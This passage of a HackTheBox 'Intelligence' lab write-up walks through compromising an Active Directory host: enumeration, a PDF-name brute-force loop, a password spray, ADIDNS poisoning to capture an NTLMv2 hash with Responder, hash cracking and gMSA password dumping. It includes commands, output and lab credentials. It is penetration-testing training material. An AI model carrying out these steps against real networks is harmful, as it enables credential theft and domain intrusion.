</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 104.01 seconds
</span></span></code></pre></div><p><code>Nmap</code> results also reveal the some domain names. I&rsquo;ll add these to my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.248 dc.intelligence.htb intelligence.htb
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>When approaching an AD box, I would definitely check for anonymous login on SMB.</p>
<p>It&rsquo;s allowed but nothing to see here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.248/
</span></span><span class="line"><span class="cl">Anonymous login successful
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
</span></span><span class="line"><span class="cl">        ---------       ----      -------
</span></span><span class="line"><span class="cl">SMB1 disabled -- no workgroup available
</span></span></code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>On LDAP, I can only retrieve the naming contexts.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.10.248 -s base namingContexts
</span></span><span class="line"><span class="cl">dn:
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.10.248 -b <span class="s2">&#34;dc=intelligence,dc=htb&#34;</span>
</span></span><span class="line"><span class="cl">Operations error <span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">Additional information: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful <span class="nb">bind</span> must be completed on the connection., data 0, v4563
</span></span></code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The website hosted on this machine is a static site with no further information to dig in.</p>
<p><div class="img-container"><img src="imgs/image-20210714112254614.png" alt="image-20210714112254614"  /></div>
</p>
<p>In the next section, there are two download buttons.</p>
<p><div class="img-container"><img src="imgs/image-20210714112325301.png" alt="image-20210714112325301"  /></div>
</p>
<p>These buttons point to two PDF files. The file contents don&rsquo;t seem to be important, but in each document&rsquo;s properties there&rsquo;s a potential username.</p>
<p>PDF 1: <code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></p>
<p><div class="img-container"><img src="imgs/image-20210714113015135.png" alt="image-20210714113015135"  /></div>
</p>
<p>PDF 2: <code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></p>
<p><div class="img-container"><img src="imgs/image-20210714113121646.png" alt="image-20210714113121646"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="access-as-tifannymolina">Access as Tifanny.Molina</h3>
<h4 id="grabbing-more-pdfs">Grabbing more PDFs</h4>
<p>Seeing the filename with pattern <code>YYYY-MM-DD</code> eventually led me to think &ldquo;Will incrementing the date give me another pdf?&rdquo;.</p>
<p>The answer is yes, it does!</p>
<p><div class="img-container"><img src="imgs/image-20210716081606506.png" alt="image-20210716081606506"  /></div>
</p>
<p>From here, I&rsquo;ll write a script to brute-force the other PDFs with <code>YYYY-MM-DD</code> timestamp pattern.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> month in <span class="o">{</span>01..12<span class="o">}</span>
</span></span><span class="line"><span class="cl"> <span class="k">do</span> 
</span></span><span class="line"><span class="cl">  <span class="k">for</span> day in <span class="o">{</span>01..31<span class="o">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span>
</span></span><span class="line"><span class="cl">     wget -q <span class="s2">&#34;http://10.10.10.248/documents/2020-</span><span class="nv">$month</span><span class="s2">-</span><span class="nv">$day</span><span class="s2">-upload.pdf&#34;</span> 2&gt;/dev/null
</span></span><span class="line"><span class="cl">  <span class="k">done</span>
</span></span><span class="line"><span class="cl"> <span class="k">done</span>
</span></span></code></pre></div><p>And here&rsquo;s what I got.</p>
<p><div class="img-container"><img src="imgs/image-20210716083456661.png" alt="image-20210716083456661"  /></div>
</p>
<p>Alternatively, I can use <code>wget</code> with brace expansion:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ wget -q http://10.10.10.248/documents/2020-<span class="o">{</span>01..12<span class="o">}</span>-<span class="o">{</span>01..31<span class="o">}</span>-upload.pdf
</span></span></code></pre></div><h4 id="harvest-username-via-pdf-metadata">Harvest Username via PDF Metadata</h4>
<p>It&rsquo;s possible to harvest the creator name from the metadata to make a list of usernames.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ exiftool * <span class="p">|</span> grep -i creator <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2 <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f2 <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">|</span> tee ../users.list 
</span></span><span class="line"><span class="cl">Anita.Roberts
</span></span><span class="line"><span class="cl">Brian.Baker
</span></span><span class="line"><span class="cl">Brian.Morris
</span></span><span class="line"><span class="cl">Daniel.Shelton
</span></span><span class="line"><span class="cl">Danny.Matthews
</span></span><span class="line"><span class="cl">Darryl.Harris
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The first idea to come with the username list is to perform <a href="/hackthebox/forest/#asrep-roasting">AS-REP Roasting</a> attack. I&rsquo;ve tried it but no luck there.</p>
<h4 id="pdf-content-examination">PDF Content Examination</h4>
<p>I discovered two non-<em>Lorem Ipsum</em> files by manually examining the PDF contents.</p>
<p>The first one is <code>2020-06-04-upload.pdf</code>, it contains the default password for new accounts in Intelligence Corp.</p>
<p><div class="img-container"><img src="imgs/image-20210716090147601.png" alt="image-20210716090147601"  /></div>
</p>
<p>The second one is <code>2020-06-04-upload.pdf</code>, it contains some internal information that will be useful later.</p>
<p><div class="img-container"><img src="imgs/image-20210716084253574.png" alt="image-20210716084253574"  /></div>
</p>
<h4 id="password-spray">Password Spray</h4>
<p>From here, I can spray the password to the username list I have harvested earlier via <code>rpcclient</code>.  This attack returns one valid pair <code>Tiffany.Molina:NewIntelligenceCorpUser9876</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.97» 
</span></span><span class="line"><span class="cl">$ rpcspray users.list password.list 10.10.10.248 <span class="p">|</span> grep -v <span class="s1">&#39;NT_STATUS_LOGON_FAILURE&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Anita.Roberts:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Brian.Baker:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Brian.Morris:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Tiffany.Molina:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl">Account Name: Tiffany.Molina, Authority Name: intelligence
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Travis.Evans:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Veronica.Patel:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;William.Lee:NewIntelligenceCorpUser9876&#39;</span> 
</span></span></code></pre></div><h4 id="smb-revisit">SMB Revisit</h4>
<p>Enumerating SMB with <code>smbmap</code> now returns a list of shares that are accessible by Tifanny.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.97» 
</span></span><span class="line"><span class="cl">$ smbmap -H 10.10.10.248 -u <span class="s1">&#39;Tiffany.Molina&#39;</span> -p <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> IP: 10.10.10.248:445        Name: dc.intelligence.htb                               
</span></span><span class="line"><span class="cl">        Disk                                                    Permissions     Comment
</span></span><span class="line"><span class="cl">        ----                                                    -----------     -------
</span></span><span class="line"><span class="cl">        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span class="line"><span class="cl">        C$                                                      NO ACCESS       Default share
</span></span><span class="line"><span class="cl">        IPC$                                                    READ ONLY       Remote IPC
</span></span><span class="line"><span class="cl">        IT                                                      READ ONLY
</span></span><span class="line"><span class="cl">        NETLOGON                                                READ ONLY       Logon server share 
</span></span><span class="line"><span class="cl">        SYSVOL                                                  READ ONLY       Logon server share 
</span></span><span class="line"><span class="cl">        Users                                                   READ ONLY
</span></span></code></pre></div><p>It turns out I can read the flag from the <code>Users</code> share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ smbclient //intelligence.htb/Users -U <span class="s1">&#39;Tiffany.Molina%NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls Tiffany.Molina<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">  .                                  DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:51:46 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  ..                                 DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:51:46 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  user.txt                           AR       <span class="m">34</span>  Thu Jul <span class="m">15</span> 08:17:40 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">3770367</span> blocks of size 4096. <span class="m">1444029</span> blocks available
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="access-as-tedgraves">Access as Ted.Graves</h3>
<h4 id="it-share">IT share</h4>
<p>On the <code>IT</code> share, there is a PowerShell script called <code>downdetector.ps1</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ smbclient //intelligence.htb/IT -U <span class="s1">&#39;Tiffany.Molina%NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  downdetector.ps1                    A     <span class="m">1046</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">3770367</span> blocks of size 4096. <span class="m">1444112</span> blocks available
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> mget downdetector.ps1 
</span></span><span class="line"><span class="cl">Get file downdetector.ps1? y
</span></span><span class="line"><span class="cl">getting file <span class="se">\d</span>owndetector.ps1 of size <span class="m">1046</span> as downdetector.ps1 <span class="o">(</span>0.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.6 KiloBytes/sec<span class="o">)</span>
</span></span></code></pre></div><p>According to the comment it is said that this script is used to check web server status.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Check web server status. Scheduled to run every 5min</span>
</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">ActiveDirectory</span> 
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$record</span> <span class="k">in</span> <span class="nb">Get-ChildItem</span> <span class="s2">&#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="n">Name</span> <span class="o">-like</span> <span class="s2">&#34;web*&#34;</span><span class="p">)</span>  <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nv">$request</span> <span class="p">=</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&#34;http://</span><span class="p">$(</span><span class="nv">$record</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2">&#34;</span> <span class="n">-UseDefaultCredentials</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(.</span><span class="py">StatusCode</span> <span class="o">-ne</span> <span class="mf">200</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nb">Send-MailMessage</span> <span class="n">-From</span> <span class="s1">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span class="n">-To</span> <span class="s1">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span class="n">-Subject</span> <span class="s2">&#34;Host: </span><span class="p">$(</span><span class="nv">$record</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2"> is down&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>If I re-query this line <code>DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb</code> with a filter of <code>name=web*</code> using <code>ldapsearch</code>, it returns the following record.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -D <span class="s1">&#39;Tiffany.Molina@intelligence.htb&#39;</span> -w <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span> -x -h 10.10.10.248 -b <span class="s2">&#34;DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> <span class="s2">&#34;name=web*&#34;</span>
</span></span><span class="line"><span class="cl">dn: <span class="nv">DC</span><span class="o">=</span>weboops,DC<span class="o">=</span>intelligence.htb,CN<span class="o">=</span>MicrosoftDNS,DC<span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>intell
</span></span><span class="line"><span class="cl"> igence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">objectClass: top
</span></span><span class="line"><span class="cl">objectClass: dnsNode
</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">DC</span><span class="o">=</span>weboops,DC<span class="o">=</span>intelligence.htb,CN<span class="o">=</span>MicrosoftDNS,DC<span class="o">=</span>DomainDns
</span></span><span class="line"><span class="cl"> Zones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">instanceType: <span class="m">4</span>
</span></span><span class="line"><span class="cl">whenCreated: 20210716071327.0Z
</span></span><span class="line"><span class="cl">whenChanged: 20210716071707.0Z
</span></span><span class="line"><span class="cl">uSNCreated: <span class="m">102869</span>
</span></span><span class="line"><span class="cl">uSNChanged: <span class="m">102872</span>
</span></span><span class="line"><span class="cl">showInAdvancedViewOnly: TRUE
</span></span><span class="line"><span class="cl">name: weboops
</span></span><span class="line"><span class="cl">objectGUID:: JGYq3NUoGU24w9fR4hg/6Q<span class="o">==</span>
</span></span><span class="line"><span class="cl">dnsRecord:: <span class="nv">CAAAAAUAAABMAAAAAAAAAAAAAAAAAAAA9mT1lRJ61wE</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">objectCategory: <span class="nv">CN</span><span class="o">=</span>Dns-Node,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">dSCorePropagationData: 16010101000000.0Z
</span></span><span class="line"><span class="cl">dNSTombstoned: TRUE
</span></span><span class="line"><span class="cl">dc: weboops
</span></span></code></pre></div><p>So the script basically looks for DNS records that begin with <code>web*</code>. For each discovered record, it performs an HTTP request to check if the record is active. And if the response code is not 200, the script sends an email notification to Ted Graves.</p>
<p>The key take away here is the wildcard (<code>*</code>).</p>
<h4 id="stealing-ntlmv2-response-via-adidns">Stealing NTLMv2 Response via ADIDNS</h4>
<p>According to <a href="https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/">this blog</a>, in Active Directory (AD), it&rsquo;s the default behavior that any authenticated user can create a new DNS record (ADIDNS). By knowing how the previous script works, it is possible to abuse this feature.</p>
<p>Here&rsquo;s the concept: I attempted to create a DNS record (subdomain) under the <code>intelligence.htb</code> that begins with &lsquo;web*&rsquo;. The purpose was to have the script encounter the record I created during its next execution. This way, it would trigger NTLM authentication as the <code>Invoke-WebRequest</code> command was used with the <code>-UseDefaultCredentials</code> flag.</p>
<p>A well-known security researcher, <a href="https://dirkjanm.io/">Dirk-jan</a>, has developed a handy tool called <code>dnstool.py</code> specifically designed for interacting with ADIDNS. This tool is included in the <code>Krbrelayx</code> repository, so I&rsquo;ll simply clone the repository onto my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «/opt» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ git clone https://github.com/dirkjanm/krbrelayx.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> krbrelayx
</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;krbrelayx&#39;</span>...
</span></span><span class="line"><span class="cl">remote: Enumerating objects: 98, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">remote: Total <span class="m">98</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">98</span>
</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>98/98<span class="o">)</span>, 65.76 KiB <span class="p">|</span> 426.00 KiB/s, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">Resolving deltas: 100% <span class="o">(</span>48/48<span class="o">)</span>, <span class="k">done</span>.
</span></span></code></pre></div><p>Now I can use the tool to add a new ADIDNS record. This record points to my machine IP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «krbrelayx» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 dnstool.py -u intelligence.htb<span class="se">\\</span>Tiffany.Molina -p <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span> -r <span class="s1">&#39;web-iamf.intelligence.htb&#39;</span> -a add -d 10.10.14.75 10.10.10.248 
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Connecting to host...
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Binding to host
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
</span></span><span class="line"><span class="cl">/opt/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve<span class="o">()</span> instead
</span></span><span class="line"><span class="cl">  <span class="nv">res</span> <span class="o">=</span> dnsresolver.query<span class="o">(</span>zone, <span class="s1">&#39;SOA&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Adding new record
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> LDAP operation completed successfully
</span></span></code></pre></div><p>At the same time, I&rsquo;ll also start the Responder. Shortly after it runs, the Ted.Graves hash appear.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «krbrelayx» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ sudo responder -I tun0
</span></span><span class="line"><span class="cl">                                         __
</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.0.6.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...                                                                                                          
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Client   : 10.10.10.248
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Username : intelligence<span class="se">\T</span>ed.Graves
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Hash     : Ted.Graves::intelligence:4cca110e84677c
</span></span></code></pre></div><h4 id="cracking-the-hash">Cracking the Hash</h4>
<p>The hash can be cracked with <code>hashcat</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./hashcat.exe -m <span class="m">5600</span> hashes/intelligence-ted.graves.hash ../../rockyou.txt -O                     ✘ INT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">TED.GRAVES::intelligence:4cca110e84677c33:3a689c04e699df8f6e1b16a599576aba:..<span class="o">[</span>SNIP<span class="o">]</span>..:Mr.Teddy
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Name........: NetNTLMv2
</span></span><span class="line"><span class="cl">Hash.Target......: TED.GRAVES::intelligence:4cca110e84677c33:3a689c04e...000000
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The credentials are valid</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.10.248 -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> 
</span></span><span class="line"><span class="cl">SMB         10.10.10.248    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span></code></pre></div><h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-with-bloodhound">Enumeration with BloodHound</h4>
<p>Even with user <code>Ted.Graves</code>, I still have no shell access. From here, I&rsquo;ll use BloodHound to explore more about the object relationships. I&rsquo;ll  use the Python ingestor.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «BloodHound.py» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 bloodhound.py -c All -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248
</span></span><span class="line"><span class="cl">INFO: Found AD domain: intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains in the forest
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> computers
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">42</span> users
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">54</span> groups
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">0</span> trusts
</span></span><span class="line"><span class="cl">INFO: Starting computer enumeration with <span class="m">10</span> workers
</span></span><span class="line"><span class="cl">INFO: Querying computer: svc_int.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Querying computer: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Skipping enumeration <span class="k">for</span> svc_int.intelligence.htb since it could not be resolved.
</span></span><span class="line"><span class="cl">INFO: Done in 00M 21S
</span></span></code></pre></div><p>Using the pre-built analytics queries “Shortest Path from Owned Principal” reveals that user <code>Ted.Graves</code> has <code>readGMSAPassword</code> permission on a service account called <code>SVC_INT</code>. And the service account has <code>AllowedToDelegate</code> permission (constrained delegation) on the DC/Machine.</p>
<p><div class="img-container"><img src="imgs/image-20210716110136841.png" alt="image-20210716110136841"  /></div>
</p>
<h4 id="read-svc_init-password">Read SVC_INIT Password</h4>
<p>According to the help feature, <code>readGMSAPassword</code> allows you to retrieve GMSA (Group Managed Service Account) password. I&rsquo;ll also note that the password might be changed after some periods just like computer account (default 30 days).</p>
<p><div class="img-container"><img src="imgs/image-20210716110314851.png" alt="image-20210716110314851"  /></div>
</p>
<p>The author of this box has already created a tool for abusing this permission: <a href="https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py">gMSADumper.py</a>. Running it retuns the password of <code>svc_int$</code> in the form of NT hash.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ./gMSADumper.py -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> -d intelligence.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Users or groups who can <span class="nb">read</span> password <span class="k">for</span> svc_int$:
</span></span><span class="line"><span class="cl"> &gt; DC$
</span></span><span class="line"><span class="cl"> &gt; itsupport
</span></span><span class="line"><span class="cl">svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
</span></span></code></pre></div><p>Since the password is managed by the DC, I don&rsquo;t have to try to crack it.</p>
